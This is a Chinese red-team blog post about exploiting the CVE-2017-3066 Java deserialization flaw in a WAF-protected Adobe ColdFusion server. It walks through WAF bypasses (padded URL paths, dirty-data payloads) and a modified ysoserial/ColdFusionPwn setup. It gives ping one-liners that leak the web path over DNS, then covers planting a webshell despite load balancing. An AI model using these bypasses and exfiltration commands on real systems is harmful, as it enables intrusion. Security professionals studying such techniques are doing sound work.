<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2nyBG96JpNJpAv4BrV4hfg)

 **Part1 前言** 

大家好，上周分享了《给任意 java 程序挂 Socks5 代理方法》、《盲猜包体对上传漏洞的艰难利用过程》两篇红队技术文章，反响还不错。本期分享一个有关 Java 反序列化漏洞的过 waf 案例。目标应用系统是 Adobe ColdFusion 动态 web 服务器，对应的漏洞编号是 CVE-2017-3066，曾经利用这个反序列化漏洞多次拿过权限。靶标直接放在公网上，网站部署了 waf，而且这个 waf 可以识别反序列化攻击数据包，我当时费时两三天的时间，绕过了层层防护，过了一个又一个关卡，最终成功 getshell，过程是非常艰辛的。

 **Part2 技术研究过程** 

*   **第 1 个坑，绕 waf 第一关**
    

Waf 首先对 url 的攻击路径做了拦截，通过扫目录扫出一个 **/flex2gateway/amf** 这个文件路径，一看就知道大概率存在 coldfusion 反序列化漏洞，居然直接放在外网靶标的网站根目录下。别高兴地太早，经过测试，只要使用 POST 请求访问这个 / flex2gateway/amf 路径，就会被 waf 拦截掉。说明在 POST 请求下，waf 识别了这个路径，遇到这个路径就认为是攻击行为，所以给拦截掉。接下来看绕过方法：

将 URL 路径 / flex2gateway/amf 转成：

http://www.xxx.com//////////////////////////////////////////flex2gateway///////////////////////////////amf

（////// 字符串是很长的，比上述要长很多，为了避免占用文章太多篇幅，我就不贴出来完整的了）

结果还是被 waf 拦截了。接下再继续加超大字符串，看如下操作：

http://www.xxx.com//////////////////////////////////////////flex2gateway///////////////////////////////amf?abc123=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Ok，我们成功绕过了 waf 设备对 url 路径的检测。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkT8SHXygE2eWiayDoCXbonJuPKdtgMSGYbJBj27PeFzJBk9rlicmBicic2w/640?wx_fmt=png)

*   **第 2 个坑，个别脚本会造成网站崩溃**
    

对于这个漏洞的利用，之前都是使用 cf_blazeds_des.py 这个脚本，但是大家使用时需要特别注意，这个脚本通过 sun.rmi.server.UnicastRef 类实现对反序列化漏洞的利用，前提是服务器必须得出网，我最近 2 年遇到的 coldfusion 反序列化漏洞，能出网直接反弹 shell 的情况越来越少了，而且顶多是 dns 能出。然后还有一个巨坑，**使用这个脚本需要提前做好功课，一次发包就利用成功，否则发个 3、5 次数据包，应用程序必然会挂掉**。所以，这个脚本我几乎不用，除非万不得已。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkNxqARdljiaHBKYbJQl5e1ibiaHIGtibZNAWTuGkjaicgfJSCw1tld8viamAQ/640?wx_fmt=png)

*   **第 3 个坑，ColdFusionPwn 工具融合**
    

接下来需要寻找对这个漏洞的不出网的利用方法，在 github 上各种搜索之后，发现 ColdFusionPwn 这个工具看起来不错，也是 java 写的，遇到问题我自己可以魔改一下。谁知道真正使用这个工具的时候，一直报错，提示无法加载主类。之前还是能正常使用的，今天却用不了了，不知道问题出在哪里。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWks4nawVC03pN29Umibm6Mk8bFV1hSNmzicyRO56HCiblQtbdictu6cZ4opA/640?wx_fmt=png)

从工具的使用说明上看，ColdFusionPwn 这个工具需要依赖于 ysoserial 这个 jar 包。干脆我下载了作者的 java 代码，使用 Intellij Idea 导入到 ysoserial 中，把代码流程稍微改了一下，这下子可以自己正常生成 payload 了，-s 与 - e 是 ColdFusionPwn 工具的两种不同的 payload 生成模式，说白了，就是漏洞的利用方法不同，实测的时候都可以用一下。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWk42RYsEnP1olDeWDY9AbGRlffo3WQYQXbvhCBlWJaSn7Xdznla8BDDQ/640?wx_fmt=png)

*   **第 4 个坑，绕 waf 第 2 关**
    

使用上一步的代码生成 payload 之后，将 payload 导入 burpsuite 的 Repeater 功能中，把数据包发送出去，结果发现 waf 又对 post 包体进行了拦截，点击 “发送” 按钮，waf 会直接把数据包丢掉，迅速返回空。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkxIicMLiaSo0Lof8JgUfHkfnPtH3D3ualKVqL0ibYfkl8AWWSzpxPb6sAQ/640?wx_fmt=png)

接下来经过一系列测试与判断，发现 waf 设备对超大数据包会放行，如下图所示，waf 设备不拦截。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWk59QgIGIhAyLYYRHgbbAAu33IZI9cg4hefGhcbFIicciadZHrjp8PLOVQ/640?wx_fmt=png)

但是这样直接在反序列化的字节数据前添加脏数据，是肯定不行的，因为无法触发反序列化攻击代码。**接下来想起了之前的同事 “回忆飘如雪” 的 Java 反序列化添加脏数据的文章**，于是我下载了他的 java 代码，经过一顿折腾，把作者写的 DirtyDataWrapper 类融合到自己的 ysoserial 里面去，实现对 ColdFusionPwn 生成的反序列化数据包的参杂脏数据的改造。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkJcyQvu9EYviaMM69SehGLM5znpPTfhGibbzTJhz5hBgjfVGAxqQUUouA/640?wx_fmt=png)

最终生成攻击代码如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkCjJ1ic4tiaoXmbhQO3EvP18E4E7vlwOZoGibh5txNGwgicn3aKOqrY50ibw/640?wx_fmt=png)

*   **第 5 个坑，过 waf 第 3 关**
    

继续看上述截图，实测发现还是被 WAF 拦截了，不知道问题出在哪里。最终经过大量的测试分析，发现只要 POST 数据包中包含 java.util.LinkedList 类关键字，waf 直接会把数据包丢弃掉。ε=(´ο｀*)))唉，真是太难了。接下来看看 “回忆飘如雪” 的 java 代码怎么写的，想把它改造一下。最终我找到了一个简单的解决办法，**将他的 DirtyDataWrapper 类代码中的 type 值恒等于 0**，这样生成的脏数据包，就不包含被 waf 拦截的敏感类了。具体为什么这么改，这里就不叙述了，大家可以自己从 github 上搜索相关代码，自己分析一下。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkibOzTWw9IQQMde3QW6QMVTibkLoJiaIw42uaw6FcRiaKiaQqiasQiaAIPRq1Q/640?wx_fmt=png)

最终生成的 payload，完美绕过 waf。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWk6XibR8ib4sCDQOBrnwpv1qjPgRncwwyb0Chom1wyCnHiab823HxP8l4Cg/640?wx_fmt=png)

*   **第 6 个坑，ysoserial 执行命令**
    

接下来要想办法拿 shell、拿靶标，很遗憾服务器是不出网的，没法直接反弹 shell。经过测试，得出结论：TCP 不出网，但是 DNS 能出。于是我就想了一个办法，通过 DNSlog 把 web 路径一点点读出来，如果一个字节一个字节读太慢，可以结合 linux 命令一段一段的读出来，然后向这个 web 路径下写入一个 webshell 即可。

但是最后新问题又来了，在实战过程中，URLDNS 这个利用链能出网，但是 ping xxx.dnslog.cn 怎么弄都不出网。。。通过 dns 读取操作系统名，发现目标服务器是 linux。最终我本地搭建了一个 coldfusion 环境，经过一系列测试，我发现问题出在 ysoserial 的 Gadgets 类的执行命令过程中。

注，对于本次测试案例，我变化了各种执行命令的写法，**经过大量的试验，必须按照如下图所示的代码写法，才能执行命令成功**。第一次遇到这种情况，其它的各种写法都不行，实践的结论就是这样，真是太难了。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkvnPibsqkQGxF9v4f8vlTlKibV19bUA7X8WDWjoicnntAXwdm7Ed64tnbA/640?wx_fmt=png)

*   **第 7 个坑，dnslog 长度限制**
    

接下来就可以通过 DNSLOG 读 web 路径了，只要拿到 web 路径，就可以直接写 shell 拿到权限了，但结果发现 dnslog 怎么都收不到路径结果。后来我想明白了，DNSlog 是有长度限制的，肯定是目标服务器的 web 路径太长了。于是，我经过测试，结合 linux 自带的系统目录 sed 与 cut，给出如下一段一段读网站绝对路径的方法。哈哈，分享给大家了。

ping `pwd|base64|sed -n '1p'|cut -c 1-60

ping `pwd|base64|sed -n '1p'|cut -c 61-80

最好用 burp 的 Collaborator client 功能，非常好用很稳定，如果用 dnslog 的话，很多时候浏览器卡了一下，dnslog 就再也看不到 dnslog 信息了，就得变换域名，非常麻烦。实战中会出现各种莫名其妙的问题，后来拿到 shell 之后，发现是负载均衡的问题。。。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkmJydYe6KnDujnolibEKrN8ZODgRYCwqaV8aFpfBVxKnJVzXxDnHO1xg/640?wx_fmt=png)

*   **第 8 个坑，负载均衡**
    

写入 webshell 之后，发现 shell 访问不到了，难道被删除了？突然我拍了下腿，我的天，这个站竟然还有负载均衡！难怪前期测试漏洞时总是会出现一些莫名其妙的问题。。。于是我开启了 burpsuite 的 intruder 功能，将写 shell 的 payload 发包了几百次，之后访问 webshell 的成功率大大提高了。。。对于负载均衡，我没有什么好的解决办法，添加 cookie 的方法也不能用。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CygxyHibQyEdEGvoxOMhrWkiczVqjHXFSeYxzmXqHKn6icALGXK5d7k2Qc4VD5Afria8hhy3umm3I0ibA/640?wx_fmt=png)

这个案例其实遇到的坑比上述还多，还有很多曲折的地方，但是时间间隔有点长，很多地方也想不起来了，但是关键点就是以上部分，欢迎大家勘误指正，给我发消息提意见。

 **Part3 总结** 

**1.** 对于反序列化漏洞的利用，很多时候都得将 exp 改一改，以适应各种环境。

**2.** 多搭建环境，避免走入死胡同。

**3.** 引用 “回忆飘如雪” 的文章： https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/

 ![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于红队、蓝队技术分享

每周一篇，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)